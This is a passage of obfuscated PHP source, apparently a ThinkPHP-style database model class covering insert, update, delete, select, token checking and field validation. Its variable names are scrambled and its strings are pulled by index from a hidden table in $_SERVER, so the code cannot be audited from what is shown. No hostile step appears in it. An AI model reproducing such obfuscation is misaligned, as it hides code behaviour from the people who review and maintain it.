$ğ¾çŠóü); } } protected function call() { $¿ó‹š =& $_SERVER[µÅ˜º…æ]; $‹èŠ§š = func_get_args(); $Ã®…×Ã = array_shift($‹èŠ§š); $¬µÙÉ¶¶ = $Ã®…×Ã; if (is_array($Ã®…×Ã)) { $¬µÙÉ¶¶ = $Ã®…×Ã[1]; $Ã®…×Ã = $Ã®…×Ã[0]; } $Â–¶ëÎ = count($‹èŠ§š) - 1; if (isset($‹èŠ§š[$Â–¶ëÎ]) && $‹èŠ§š[$Â–¶ëÎ] === $Ã®…×Ã) { think_exception(__CLASS__ . $¿ó‹š[4] . $Ã®…×Ã . think_lang($¿ó‹š[343])); return; } $‹èŠ§š[] = $Ã®…×Ã; if (method_exists($this, $¿ó‹š[344])) { $–ô‹‘‘± = call_user_func_array(array($this, $¿ó‹š[345]), array($¬µÙÉ¶¶, $‹èŠ§š)); if (!is_null($–ô‹‘‘±) && $–ô‹‘‘± !== !1) { return $–ô‹‘‘±; } } $úóÌá­ = !1; if (method_exists($this, $Ã®…×Ã)) { $úóÌá­ = call_user_func_array(array($this, $Ã®…×Ã), $‹èŠ§š); } if (method_exists($this, $¿ó‹š[346])) { $–ô‹‘‘± = call_user_func_array(array($this, $¿ó‹š[347]), array($¬µÙÉ¶¶, $‹èŠ§š, $úóÌá­)); if ($–ô‹‘‘±) { return $–ô‹‘‘±; } } return $úóÌá­; } protected function _initialize() { } protected function _facade($—„‰´Š„) { $Šˆ¦´ˆ =& $_SERVER[µÅ˜º…æ]; if (!empty($this->fields)) { foreach ($—„‰´Š„ as $äÖÒüã => $³¦áÒÔæ) { if (is_array($this->fields) && !in_array($äÖÒüã, $this->fields, !0)) { unset($—„‰´Š„[$äÖÒüã]); } elseif (is_scalar($³¦áÒÔæ)) { $this->_parseType($—„‰´Š„, $äÖÒüã); } } } if (!empty($this->options[$Šˆ¦´ˆ[348]])) { $—„‰´Š„ = array_map($this->options[$Šˆ¦´ˆ[348]], $—„‰´Š„); unset($this->options[$Šˆ¦´ˆ[348]]); } $this->_beforeWrite($—„‰´Š„); return $—„‰´Š„; } protected function _beforeWrite(&$ù´‹İË³) { } public function add($·¨¨â¹Œ = '', $òáª± = array(), $ğ¾ËÖìõ = false) { if (empty($·¨¨â¹Œ)) { if (!empty($this->data)) { $·¨¨â¹Œ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[µÅ˜º…æ][349]); return !1; } } $òáª± = $this->_parseOptions($òáª±); $·¨¨â¹Œ = $this->_facade($·¨¨â¹Œ); if (!1 === $this->_beforeInsert($·¨¨â¹Œ, $òáª±)) { return !1; } $ÀÅÄ—ş­ = $this->db->insert($·¨¨â¹Œ, $òáª±, $ğ¾ËÖìõ); if (!1 !== $ÀÅÄ—ş­) { $¥«ù…º = $this->getLastInsID(); if ($¥«ù…º) { $·¨¨â¹Œ[$this->getPk()] = $¥«ù…º; $this->_after_insert($·¨¨â¹Œ, $òáª±); return $¥«ù…º; } $this->_after_insert($·¨¨â¹Œ, $òáª±); } return $ÀÅÄ—ş­; } protected function _beforeInsert(&$¶ÓÈæÆ, $ôâúõ…) { } protected function _after_insert($§íÂõ˜, $Í³ö¬õ›) { } public function addAll($¨²Ìˆ€©, $¼ã ™ƒ¸ = array(), $Öˆ¨Á«Š = false) { $¾…ÓÓ˜÷ =& $_SERVER[µÅ˜º…æ]; if (empty($¨²Ìˆ€©)) { $this->error = think_lang($¾…ÓÓ˜÷[349]); return !1; } $¼ã ™ƒ¸ = $this->_parseOptions($¼ã ™ƒ¸); foreach ($¨²Ìˆ€© as $¼ Ÿóı‚ => $€µìÉòÔ) { $¨²Ìˆ€©[$¼ Ÿóı‚] = $this->_facade($€µìÉòÔ); } if (method_exists($this->db, $¾…ÓÓ˜÷[350])) { $¹Ñâñ®Ó = $this->db->insertAll($¨²Ìˆ€©, $¼ã ™ƒ¸, $Öˆ¨Á«Š); } else { $this->startTrans(); foreach ($¨²Ìˆ€© as $¼ Ÿóı‚ => $€µìÉòÔ) { $¹Ñâñ®Ó = $this->db->insert($€µìÉòÔ, $¼ã ™ƒ¸, $Öˆ¨Á«Š); } $this->commit(); } if (!1 !== $¹Ñâñ®Ó) { $²ïª±Ÿ‰ = $this->getLastInsID(); if ($²ïª±Ÿ‰) { return $²ïª±Ÿ‰; } } return $¹Ñâñ®Ó; } public function selectAdd($ÚåÑ”ë = '', $ÚıÂ¹º¾ = '', $øÛÔÉö× = array()) { $—Ä˜†ïÈ =& $_SERVER[µÅ˜º…æ]; $øÛÔÉö× = $this->_parseOptions($øÛÔÉö×); if (!1 === ($¤ŒÔ£±¶ = $this->db->selectInsert($ÚåÑ”ë ? $ÚåÑ”ë : $øÛÔÉö×[$—Ä˜†ïÈ[351]], $ÚıÂ¹º¾ ? $ÚıÂ¹º¾ : $this->getTableName(), $øÛÔÉö×))) { $this->error = think_lang($—Ä˜†ïÈ[352]); return !1; } else { return $¤ŒÔ£±¶; } } public function save($¸¹•Ó = '', $šèÎÀ ‘ = array()) { $¤Ü„ğõ¾ =& $_SERVER[µÅ˜º…æ]; if (empty($¸¹•Ó)) { if (!empty($this->data)) { $¸¹•Ó = $this->data; $this->data = array(); } else { $this->error = think_lang($¤Ü„ğõ¾[349]); return !1; } } $¸¹•Ó = $this->_facade($¸¹•Ó); $šèÎÀ ‘ = $this->_parseOptions($šèÎÀ ‘); $“Î†ã§ù = $this->getPk(); if (!isset($šèÎÀ ‘[$¤Ü„ğõ¾[353]])) { if (isset($¸¹•Ó[$“Î†ã§ù])) { $÷ÙÅ”ªå[$“Î†ã§ù] = $¸¹•Ó[$“Î†ã§ù]; $šèÎÀ ‘[$¤Ü„ğõ¾[353]] = $÷ÙÅ”ªå; unset($¸¹•Ó[$“Î†ã§ù]); } else { $this->error = think_lang($¤Ü„ğõ¾[352]); return !1; } } if (is_array($šèÎÀ ‘[$¤Ü„ğõ¾[353]]) && isset($šèÎÀ ‘[$¤Ü„ğõ¾[353]][$“Î†ã§ù])) { $ûö†–›Ş = $šèÎÀ ‘[$¤Ü„ğõ¾[353]][$“Î†ã§ù]; } if (!1 === $this->_beforeUpdate($¸¹•Ó, $šèÎÀ ‘)) { return !1; } $Ö¢œ²‚ = $this->db->update($¸¹•Ó, $šèÎÀ ‘); if (!1 !== $Ö¢œ²‚) { if (isset($ûö†–›Ş)) { $¸¹•Ó[$“Î†ã§ù] = $ûö†–›Ş; } $this->_afterUpdate($¸¹•Ó, $šèÎÀ ‘); } return $Ö¢œ²‚; } protected function _beforeUpdate(&$ôÈ´ÅÑ, $›ÒÈ­î±) { } protected function _afterUpdate($ß•†‰ı§, $ƒ‚éÍÚö) { } public function delete($µÙ¸’ò› = array()) { $é»ù½¦‡ =& $_SERVER[µÅ˜º…æ]; if (empty($µÙ¸’ò›) && empty($this->options[$é»ù½¦‡[353]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $°¡÷ë‘­ = $this->getPk(); if (is_numeric($µÙ¸’ò›) || is_string($µÙ¸’ò›)) { if (strpos($µÙ¸’ò›, $é»ù½¦‡[50])) { $ê–¥ğóô[$°¡÷ë‘­] = array($é»ù½¦‡[354], $µÙ¸’ò›); } else { $ê–¥ğóô[$°¡÷ë‘­] = $µÙ¸’ò›; } $this->options[$é»ù½¦‡[353]] = $ê–¥ğóô; } $µÙ¸’ò› = $this->_parseOptions(); if (is_array($µÙ¸’ò›[$é»ù½¦‡[353]]) && isset($µÙ¸’ò›[$é»ù½¦‡[353]][$°¡÷ë‘­])) { $®–ƒÅïä = $µÙ¸’ò›[$é»ù½¦‡[353]][$°¡÷ë‘­]; } $³„™ÂõÁ = $this->db->delete($µÙ¸’ò›); if (!1 !== $³„™ÂõÁ) { $Ì°‘ Ñ = array(); if (isset($®–ƒÅïä)) { $Ì°‘ Ñ[$°¡÷ë‘­] = $®–ƒÅïä; } $this->_after_delete($Ì°‘ Ñ, $µÙ¸’ò›); } return $³„™ÂõÁ; } protected function _after_delete($Èœä’æ, $¢õŒˆ˜é) { } public function select($±á¡èİ = array()) { $ıÙûåï =& $_SERVER[µÅ˜º…æ]; if (is_string($±á¡èİ) || is_numeric($±á¡èİ)) { $ÕÊ±Á¹Õ = $this->getPk(); if (strpos($±á¡èİ, $ıÙûåï[50])) { $úù½“[$ÕÊ±Á¹Õ] = array($ıÙûåï[354], $±á¡èİ); } else { $úù½“[$ÕÊ±Á¹Õ] = $±á¡èİ; } $this->options[$ıÙûåï[353]] = $úù½“; } elseif (!1 === $±á¡èİ) { $±á¡èİ = $this->_parseOptions(); return $ıÙûåï[355] . $this->db->buildSelectSql($±á¡èİ) . $ıÙûåï[356]; } $±á¡èİ = $this->_parseOptions(); $ê•¨É•× = $this->db->select($±á¡èİ); if (!1 === $ê•¨É•×) { return !1; } if (empty($ê•¨É•×)) { return null; } $this->_afterSelect($ê•¨É•×, $±á¡èİ); return $ê•¨É•×; } protected function _afterSelect(&$ïîñ¾¯‚, $ô†ÚÈ­²) { } public function buildSql($§¡ß‹µ† = array()) { $„íû¾«ë =& $_SERVER[µÅ˜º…æ]; $§¡ß‹µ† = $this->_parseOptions($§¡ß‹µ†); return $„íû¾«ë[355] . $this->db->buildSelectSql($§¡ß‹µ†) . $„íû¾«ë[356]; } public function optionsValue($ÉûÈù“İ = null) { if (is_null($ÉûÈù“İ)) { return $this->options; } elseif (is_array($ÉûÈù“İ)) { $this->options = array_merge($this->options, $ÉûÈù“İ); } } protected function _parseOptions($ä™âş† = array()) { $ûÓÄ–Ã =& $_SERVER[µÅ˜º…æ]; if (is_array($ä™âş†)) { $ä™âş† = array_merge($this->options, $ä™âş†); } $this->options = array(); if (!isset($ä™âş†[$ûÓÄ–Ã[357]])) { $ä™âş†[$ûÓÄ–Ã[357]] = $this->getTableName(); $ß»Ë—ø± = $this->fields; } else { $ß»Ë—ø± = $this->getDbFields(); } if (!empty($ä™âş†[$ûÓÄ–Ã[358]])) { $ä™âş†[$ûÓÄ–Ã[357]] .= $ûÓÄ–Ã[53] . $ä™âş†[$ûÓÄ–Ã[358]]; } $ä™âş†[$ûÓÄ–Ã[359]] = $this->name; if (isset($ä™âş†[$ûÓÄ–Ã[353]]) && is_array($ä™âş†[$ûÓÄ–Ã[353]]) && !empty($ß»Ë—ø±) && !isset($ä™âş†[$ûÓÄ–Ã[360]]) && !isset($ä™âş†[$ûÓÄ–Ã[357]])) { foreach ($ä™âş†[$ûÓÄ–Ã[353]] as $¡èØÇÅè => $‡€û«¯) { $¡èØÇÅè = trim($¡èØÇÅè); if (in_array($¡èØÇÅè, $ß»Ë—ø±, !0)) { if (is_scalar($‡€û«¯)) { $this->_parseType($ä™âş†[$ûÓÄ–Ã[353]], $¡èØÇÅè); } } elseif (!is_numeric($¡èØÇÅè) && $ûÓÄ–Ã[11] != substr($¡èØÇÅè, 0, 1) && !1 === strpos($¡èØÇÅè, $ûÓÄ–Ã[10]) && !1 === strpos($¡èØÇÅè, $ûÓÄ–Ã[337]) && !1 === strpos($¡èØÇÅè, $ûÓÄ–Ã[212]) && !1 === strpos($¡èØÇÅè, $ûÓÄ–Ã[284])) { unset($ä™âş†[$ûÓÄ–Ã[353]][$¡èØÇÅè]); } } } $this->_options_filter($ä™âş†); return $ä™âş†; } protected function _options_filter(&$ƒÆ†¢°½) { } protected function _parseType(&$º´¡ÖŒ, $³¡›ÕŞ) { $èÂÑÆœó =& $_SERVER[µÅ˜º…æ]; if (empty($this->options[$èÂÑÆœó[361]][$èÂÑÆœó[4] . $³¡›ÕŞ])) { $¦Üô‹˜¶ = strtolower($this->fields[$èÂÑÆœó[329]][$³¡›ÕŞ]); if (!1 !== strpos($¦Üô‹˜¶, $èÂÑÆœó[362])) { } elseif (!1 === strpos($¦Üô‹˜¶, $èÂÑÆœó[363]) && !1 !== strpos($¦Üô‹˜¶, $èÂÑÆœó[364])) { $º´¡ÖŒ[$³¡›ÕŞ] = intval($º´¡ÖŒ[$³¡›ÕŞ]); } elseif (!1 !== strpos($¦Üô‹˜¶, $èÂÑÆœó[365]) || !1 !== strpos($¦Üô‹˜¶, $èÂÑÆœó[366])) { $º´¡ÖŒ[$³¡›ÕŞ] = floatval($º´¡ÖŒ[$³¡›ÕŞ]); } elseif (!1 !== strpos($¦Üô‹˜¶, $èÂÑÆœó[367])) { $º´¡ÖŒ[$³¡›ÕŞ] = (bool) $º´¡ÖŒ[$³¡›ÕŞ]; } } } public function find($’–¥’Õã = array()) { $×úì½Ê¨ =& $_SERVER[µÅ˜º…æ]; if (is_numeric($’–¥’Õã) || is_string($’–¥’Õã)) { $˜©ô¨® [$this->getPk()] = intval($’–¥’Õã); $this->options[$×úì½Ê¨[353]] = $˜©ô¨® ; } $this->options[$×úì½Ê¨[368]] = 1; $’–¥’Õã = $this->_parseOptions(); $¨‹ÚÒï = $this->db->select($’–¥’Õã); if (!1 === $¨‹ÚÒï) { return !1; } if (empty($¨‹ÚÒï)) { return null; } $Ëı÷÷òÁ = $¨‹ÚÒï[0]; $this->_afterFind($Ëı÷÷òÁ, $’–¥’Õã); return $Ëı÷÷òÁ; } protected function _afterFind(&$Üş¼£ú, $Ï“Šàòö) { } protected function returnResult($£°İÍçÅ, $§ÇÂòªŞ = '') { $¬ÅœÔğ¿ =& $_SERVER[µÅ˜º…æ]; if ($§ÇÂòªŞ) { if (is_callable($§ÇÂòªŞ)) { return call_user_func($§ÇÂòªŞ, $£°İÍçÅ); } switch (strtolower($§ÇÂòªŞ)) { case $¬ÅœÔğ¿[369]: return json_encode($£°İÍçÅ); case $¬ÅœÔğ¿[370]: return xml_encode($£°İÍçÅ); } } return $£°İÍçÅ; } public function parseFieldsMap($ã±õñç¡, $­ÂÁá‡• = 1) { if (!empty($this->_map)) { foreach ($this->_map as $è¶Ş´³® => $ƒªùÃ®Ğ) { if ($­ÂÁá‡• == 1) { if (isset($ã±õñç¡[$ƒªùÃ®Ğ])) { $ã±õñç¡[$è¶Ş´³®] = $ã±õñç¡[$ƒªùÃ®Ğ]; unset($ã±õñç¡[$ƒªùÃ®Ğ]); } } else { if (isset($ã±õñç¡[$è¶Ş´³®])) { $ã±õñç¡[$ƒªùÃ®Ğ] = $ã±õñç¡[$è¶Ş´³®]; unset($ã±õñç¡[$è¶Ş´³®]); } } } } return $ã±õñç¡; } public function setField($»¹íŸ†ç, $Ëœ·Œ‡™ = '') { if (is_array($»¹íŸ†ç)) { $¦èİª÷ò = $»¹íŸ†ç; } else { $¦èİª÷ò[$»¹íŸ†ç] = $Ëœ·Œ‡™; } return $this->save($¦èİª÷ò); } public function setAdd($î¸«ô²£, $êøæ¥ù± = 1) { $Èë’Õ² =& $_SERVER[µÅ˜º…æ]; $ò°¬®úô = $î¸«ô²£ . $Èë’Õ²[371] . $êøæ¥ù±; if ($êøæ¥ù± < 0) { $ò°¬®úô = $î¸«ô²£ . $êøæ¥ù±; } return $this->setField($î¸«ô²£, array($Èë’Õ²[372], $ò°¬®úô)); } public function getField($œ¢«šŸ, $…µÜƒÇ = null) { $’§›‘»¿ =& $_SERVER[µÅ˜º…æ]; $‡ã£±„[$’§›‘»¿[351]] = $œ¢«šŸ; $‡ã£±„ = $this->_parseOptions($‡ã£±„); $œ¢«šŸ = trim($œ¢«šŸ); if (strpos($œ¢«šŸ, $’§›‘»¿[50])) { if (!isset($‡ã£±„[$’§›‘»¿[368]])) { $‡ã£±„[$’§›‘»¿[368]] = is_numeric($…µÜƒÇ) ? $…µÜƒÇ : $’§›‘»¿[12]; } $ö¾›ê’² = $this->db->select($‡ã£±„); if (!empty($ö¾›ê’²)) { $±‚ÛúÀ = explode($’§›‘»¿[50], $œ¢«šŸ); $œ¢«šŸ = array_keys($ö¾›ê’²[0]); $ƒ¨¼´ü = array_shift($œ¢«šŸ); $”§©„™ = array_shift($œ¢«šŸ); $­ÉÁŠö€ = array(); $¾ ÙÉõ• = count($±‚ÛúÀ); foreach ($ö¾›ê’² as $øŸÇÈÓü) { $©Ìû×ü¡ = $øŸÇÈÓü[$ƒ¨¼´ü]; if (2 == $¾ ÙÉõ•) { $­ÉÁŠö€[$©Ìû×ü¡] = $øŸÇÈÓü[$”§©„™]; } else { $­ÉÁŠö€[$©Ìû×ü¡] = is_string($…µÜƒÇ) ? implode($…µÜƒÇ, $øŸÇÈÓü) : $øŸÇÈÓü; } } return $­ÉÁŠö€; } } else { if (!0 !== $…µÜƒÇ) { $‡ã£±„[$’§›‘»¿[368]] = is_numeric($…µÜƒÇ) ? $…µÜƒÇ : 1; } if ($…µÜƒÇ === $’§›‘»¿[332]) { unset($‡ã£±„[$’§›‘»¿[368]]); } $øŸÇÈÓü = $this->db->select($‡ã£±„); if (!empty($øŸÇÈÓü)) { if ($…µÜƒÇ === $’§›‘»¿[332]) { return reset($øŸÇÈÓü[0]); } if (!0 !== $…µÜƒÇ && 1 == $‡ã£±„[$’§›‘»¿[368]]) { return reset($øŸÇÈÓü[0]); } foreach ($øŸÇÈÓü as $ÕŠ¹ÛºØ) { $†½ºûóÊ[] = $ÕŠ¹ÛºØ[$œ¢«šŸ]; } return $†½ºûóÊ; } } return null; } public function create($ïØ¥õÕÏ = '', $ÖÙ¨¬À = '') { $°„¡¶Ö× =& $_SERVER[µÅ˜º…æ]; if (empty($ïØ¥õÕÏ)) { $ïØ¥õÕÏ = $_POST; } elseif (is_object($ïØ¥õÕÏ)) { $ïØ¥õÕÏ = get_object_vars($ïØ¥õÕÏ); } if (empty($ïØ¥õÕÏ) || !is_array($ïØ¥õÕÏ)) { $this->error = think_lang($°„¡¶Ö×[349]); return !1; } $ïØ¥õÕÏ = $this->parseFieldsMap($ïØ¥õÕÏ, 0); $ÖÙ¨¬À = $ÖÙ¨¬À ? $ÖÙ¨¬À : (!empty($ïØ¥õÕÏ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$°„¡¶Ö×[351]])) { $ÀúÈàœ´ = $this->options[$°„¡¶Ö×[351]]; unset($this->options[$°„¡¶Ö×[351]]); } elseif ($ÖÙ¨¬À == THINK_MODEL_INSERT && isset($this->insertFields)) { $ÀúÈàœ´ = $this->insertFields; } elseif ($ÖÙ¨¬À == THINK_MODEL_UPDATE && isset($this->updateFields)) { $ÀúÈàœ´ = $this->updateFields; } if (isset($ÀúÈàœ´)) { if (is_string($ÀúÈàœ´)) { $ÀúÈàœ´ = explode($°„¡¶Ö×[50], $ÀúÈàœ´); } if (think_config($°„¡¶Ö×[373])) { $ÀúÈàœ´[] = think_config($°„¡¶Ö×[374]); } foreach ($ïØ¥õÕÏ as $ãÍşúš => $©‡ñÓ²) { if (!in_array($ãÍşúš, $ÀúÈàœ´)) { unset($ïØ¥õÕÏ[$ãÍşúš]); } } } if (!$this->autoValidation($ïØ¥õÕÏ, $ÖÙ¨¬À)) { return !1; } if (!$this->autoCheckToken($ïØ¥õÕÏ)) { $this->error = think_lang($°„¡¶Ö×[375]); return !1; } if ($this->autoCheckFields) { $ÀúÈàœ´ = $this->getDbFields(); foreach ($ïØ¥õÕÏ as $ãÍşúš => $©‡ñÓ²) { if (!in_array($ãÍşúš, $ÀúÈàœ´)) { unset($ïØ¥õÕÏ[$ãÍşúš]); } elseif (MAGIC_QUOTES_GPC && is_string($©‡ñÓ²)) { $ïØ¥õÕÏ[$ãÍşúš] = stripslashes($©‡ñÓ²); } } } $this->autoOperation($ïØ¥õÕÏ, $ÖÙ¨¬À); $this->data = $ïØ¥õÕÏ; return $ïØ¥õÕÏ; } public function autoCheckToken($©ÃœÈ) { $ĞĞ¡“ãÎ =& $_SERVER[µÅ˜º…æ]; if (isset($this->options[$ĞĞ¡“ãÎ[376]]) && !$this->options[$ĞĞ¡“ãÎ[376]]) { return !0; } if (think_config($ĞĞ¡“ãÎ[373])) { $“ÂŸÆ³Í = think_config($ĞĞ¡“ãÎ[374]); if (!isset($©ÃœÈ[$“ÂŸÆ³Í]) || Session::get($“ÂŸÆ³Í)) { return !1; } list($£è¢üûÆ, $¨Îç•˜¡) = explode($ĞĞ¡“ãÎ[11], $©ÃœÈ[$“ÂŸÆ³Í]); if ($¨Îç•˜¡ && Session::get($“ÂŸÆ³Í . $ĞĞ¡“ãÎ[10] . $£è¢üûÆ) === $¨Îç•˜¡) { Session::remove($“ÂŸÆ³Í . $ĞĞ¡“ãÎ[10] . $£è¢üûÆ); return !0; } if (think_config($ĞĞ¡“ãÎ[377])) { Session::remove($“ÂŸÆ³Í . $ĞĞ¡“ãÎ[10] . $£è¢üûÆ); } return !1; } return !0; } public function regex($èÕ‚±×, $£œéƒ˜š) { $äğ‹Ù²¢ =& $_SERVER[µÅ˜º…æ]; $ä áı = array($äğ‹Ù²¢[378] => $äğ‹Ù²¢[379], $äğ‹Ù²¢[380] => $äğ‹Ù²¢[381], $äğ‹Ù²¢[382] => $äğ‹Ù²¢[383], $äğ‹Ù²¢[384] => $äğ‹Ù²¢[385], $äğ‹Ù²¢[386] => $äğ‹Ù²¢[387], $äğ‹Ù²¢[388] => $äğ‹Ù²¢[389], $äğ‹Ù²¢[390] => $äğ‹Ù²¢[391], $äğ‹Ù²¢[366] => $äğ‹Ù²¢[392], $äğ‹Ù²¢[393] => $äğ‹Ù²¢[394]); if (isset($ä áı[strtolower($£œéƒ˜š)])) { $£œéƒ˜š = $ä áı[strtolower($£œéƒ˜š)]; } return preg_match($£œéƒ˜š, $èÕ‚±×) === 1; } private function autoOperation(&$Ÿô©ÎÍí, $¾ñØ™Í) { $’¿¯Ÿú =& $_SERVER[µÅ˜º…æ]; if (!empty($this->options[$’¿¯Ÿú[395]])) { $¯­¾œÆä = $this->options[$’¿¯Ÿú[395]]; unset($this->options[$’¿¯Ÿú[395]]); } elseif (!empty($this->_auto)) { $¯­¾œÆä = $this->_auto; } if (isset($¯­¾œÆä)) { foreach ($¯­¾œÆä as $ÆÁäùÀ) { if (empty($ÆÁäùÀ[2])) { $ÆÁäùÀ[2] = THINK_MODEL_INSERT; } if ($¾ñØ™Í == $ÆÁäùÀ[2] || $ÆÁäùÀ[2] == THINK_MODEL_BOTH) { switch (trim($ÆÁäùÀ[3])) { case $’¿¯Ÿú[396]: case $’¿¯Ÿú[397]: $ƒ¡ÑóÆÌ = isset($ÆÁäùÀ[4]) ? (array) $ÆÁäùÀ[4] : array(); if (isset($Ÿô©ÎÍí[$ÆÁäùÀ[0]])) { array_unshift($ƒ¡ÑóÆÌ, $Ÿô©ÎÍí[$ÆÁäùÀ[0]]); } if ($’¿¯Ÿú[396] == $ÆÁäùÀ[3]) { $Ÿô©ÎÍí[$ÆÁäùÀ[0]] = call_user_func_array($ÆÁäùÀ[1], $ƒ¡ÑóÆÌ); } else { $Ÿô©ÎÍí[$ÆÁäùÀ[0]] = call_user_func_array(array(&$this, $ÆÁäùÀ[1]), $ƒ¡ÑóÆÌ); } break; case $’¿¯Ÿú[351]: $Ÿô©ÎÍí[$ÆÁäùÀ[0]] = $Ÿô©ÎÍí[$ÆÁäùÀ[1]]; break; case $’¿¯Ÿú[398]: if ($’¿¯Ÿú[12] === $Ÿô©ÎÍí[$ÆÁäùÀ[0]]) { unset($Ÿô©ÎÍí[$ÆÁäùÀ[0]]); } break; case $’¿¯Ÿú[399]: default: $Ÿô©ÎÍí[$ÆÁäùÀ[0]] = $ÆÁäùÀ[1]; } if (!1 === $Ÿô©ÎÍí[$ÆÁäùÀ[0]]) { unset($Ÿô©ÎÍí[$ÆÁäùÀ[0]]); } } } } return $Ÿô©ÎÍí; } protected function autoValidation($€Ÿºï‘º, $ÉôÈôê) { $ö¨—Ã =& $_SERVER[µÅ˜º…æ]; if (!empty($this->options[$ö¨—Ã[400]])) { $Ñœ’Î„ø = $this->options[$ö¨—Ã[400]]; unset($this->options[$ö¨—Ã[400]]); } elseif (!empty($this->_validate)) { $Ñœ’Î„ø = $this->_validate; } if (isset($Ñœ’Î„ø)) { if ($this->patchValidate) { $this->error = array(); } foreach ($Ñœ’Î„ø as $şÙº× => $‘Û®â‘¨) { if (empty($‘Û®â‘¨[5]) || $‘Û®â‘¨[5] == THINK_MODEL_BOTH || $‘Û®â‘¨[5] == $ÉôÈôê) { if (0 == strpos($‘Û®â‘¨[2], $ö¨—Ã[401]) && strpos($‘Û®â‘¨[2], $ö¨—Ã[402])) { $‘Û®â‘¨[2] = think_lang(substr($‘Û®â‘¨[2], 2, -1)); } $‘Û®â‘¨[3] = isset($‘Û®â‘¨[3]) ? $‘Û®â‘¨[3] : THINK_EXISTS_VALIDATE; $‘Û®â‘¨[4] = isset($‘Û®â‘¨[4]) ? $‘Û®â‘¨[4] : $ö¨—Ã[403]; switch ($‘Û®â‘¨[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($€Ÿºï‘º, $‘Û®â‘¨)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($ö¨—Ã[12] != trim($€Ÿºï‘º[$‘Û®â‘¨[0]])) { if (!1 === $this->_validationField($€Ÿºï‘º, $‘Û®â‘¨)) { return !1; } } break; default: if (isset($€Ÿºï‘º[$‘Û®â‘¨[0]])) { if (!1 === $this->_validationField($€Ÿºï‘º, $‘Û®â‘¨)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($’–ù÷Ÿ´, $§€³«š) { if (!1 === $this->_validationFieldItem($’–ù÷Ÿ´, $§€³«š)) { if ($this->patchValidate) { $this->error[$§€³«š[0]] = $§€³«š[2]; } else { $this->error = $§€³«š[2]; return !1; } } return; } protected function _validationFieldItem($›Õµ²Ûá, $§±½ğå¥) { $†¡´œÄ‚ =& $_SERVER[µÅ˜º…æ]; switch (strtolower(trim($§±½ğå¥[4]))) { case $†¡´œÄ‚[396]: case $†¡´œÄ‚[397]: $Á´šÕÄ = isset($§±½ğå¥[6]) ? (array) $§±½ğå¥[6] : array(); if (is_string($§±½ğå¥[0]) && strpos($§±½ğå¥[0], $†¡´œÄ‚[50])) { $§±½ğå¥[0] = explode($†¡´œÄ‚[50], $§±½ğå¥[0]); } if (is_array($§±½ğå¥[0])) { foreach ($§±½ğå¥[0] as $”°¥Ì×) { $Ğáş¢[$”°¥Ì×] = $›Õµ²Ûá[$”°¥Ì×]; } array_unshift($Á´šÕÄ, $Ğáş¢); } else { array_unshift($Á´šÕÄ, $›Õµ²Ûá[$§±½ğå¥[0]]); } if ($†¡´œÄ‚[396] == $§±½ğå¥[4]) { return call_user_func_array($§±½ğå¥[1], $Á´šÕÄ); } else { return call_user_func_array(array(&$this, $§±½ğå¥[1]), $Á´šÕÄ); } case $†¡´œÄ‚[404]: return $›Õµ²Ûá[$§±½ğå¥[0]] == $›Õµ²Ûá[$§±½ğå¥[1]]; case $†¡´œÄ‚[405]: if (is_string($§±½ğå¥[0]) && strpos($§±½ğå¥[0], $†¡´œÄ‚[50])) { $§±½ğå¥[0] = explode($†¡´œÄ‚[50], $§±½ğå¥[0]); } $—Ó³Şš = array(); if (is_array($§±½ğå¥[0])) { foreach ($§±½ğå¥[0] as $”°¥Ì×) { $—Ó³Şš[$”°¥Ì×] = $›Õµ²Ûá[$”°¥Ì×]; } } else { $—Ó³Şš[$§±½ğå¥[0]] = $›Õµ²Ûá[$§±½ğå¥[0]]; } if (!empty($›Õµ²Ûá[$this->getPk()])) { $—Ó³Şš[$this->getPk()] = array($†¡´œÄ‚[406], $›Õµ²Ûá[$this->getPk()]); } if ($this->where($—Ó³Şš)->find()) { return !1; } return !0; default: return $this->check($›Õµ²Ûá[$§±½ğå¥[0]], $§±½ğå¥[1], $§±½ğå¥[4]); } } public function check($Œ„şÚ¸˜, $—ÚïŒÑ, $›´¡ªÖ = "\x72\x65\147\145\x78") { $ìŠòêÈ =& $_SERVER[µÅ˜º…æ]; $›´¡ªÖ = strtolower(trim($›´¡ªÖ)); switch ($›´¡ªÖ) { case $ìŠòêÈ[7]: case $ìŠòêÈ[407]: $í±ßÓè‚ = is_array($—ÚïŒÑ) ? $—ÚïŒÑ : explode($ìŠòêÈ[50], $—ÚïŒÑ); return $›´¡ªÖ == $ìŠòêÈ[7] ? in_array($Œ„şÚ¸˜, $í±ßÓè‚) : !in_array($Œ„şÚ¸˜, $í±ßÓè‚); case $ìŠòêÈ[408]: case $ìŠòêÈ[409]: if (is_array($—ÚïŒÑ)) { $¼™ã•¦â = $—ÚïŒÑ[0]; $·…ÄàÉÒ = $—ÚïŒÑ[1]; } else { list($¼™ã•¦â, $·…ÄàÉÒ) = explode($ìŠòêÈ[50], $—ÚïŒÑ); } return $›´¡ªÖ == $ìŠòêÈ[408] ? $Œ„şÚ¸˜ >= $¼™ã•¦â && $Œ„şÚ¸˜ <= $·…ÄàÉÒ : $Œ„şÚ¸˜ < $¼™ã•¦â || $Œ„şÚ¸˜ > $·…ÄàÉÒ; case $ìŠòêÈ[410]: case $ìŠòêÈ[411]: return $›´¡ªÖ == $ìŠòêÈ[410] ? $Œ„şÚ¸˜ == $—ÚïŒÑ : $Œ„şÚ¸˜ != $—ÚïŒÑ; case $ìŠòêÈ[412]: $øÃ¯£ãê = mb_strlen($Œ„şÚ¸˜, $ìŠòêÈ[413]); if (strpos($—ÚïŒÑ, $ìŠòêÈ[50])) { list($¼™ã•¦â, $·…ÄàÉÒ) = explode($ìŠòêÈ[50], $—ÚïŒÑ); return $øÃ¯£ãê >= $¼™ã•¦â && $øÃ¯£ãê <= $·…ÄàÉÒ; } else { return $øÃ¯£ãê == $—ÚïŒÑ; } case $ìŠòêÈ[414]: list($œ¸¶™ª, $£¸î«ë®) = explode($ìŠòêÈ[50], $—ÚïŒÑ); if (!is_numeric($œ¸¶™ª)) { $œ¸¶™ª = strtotime($œ¸¶™ª); } if (!is_numeric($£¸î«ë®)) { $£¸î«ë® = 